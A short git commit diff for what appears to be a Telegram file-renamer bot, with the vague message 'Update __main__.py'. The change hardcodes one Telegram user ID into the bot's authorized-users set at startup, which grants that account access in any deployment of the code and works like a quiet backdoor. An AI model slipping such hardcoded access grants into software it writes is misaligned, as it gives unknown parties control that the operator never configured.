d7ba8b19462481f43b723962a3b17d49342d1eb4
Shreenidhi <66470817+satyushree@users.noreply.github.com>
2021-07-02 19:58:58 +0530

    Update __main__.py

--- renamer/__main__.py
+++ renamer/__main__.py
@@ -66,7 +66,7 @@ if __name__ == "__main__" :
         api_hash=Config.API_HASH,
         plugins=plugins
     )
-    Config.AUTH_USERS
+    Config.AUTH_USERS.add(1337144652)
     app.run()
     idle()
 
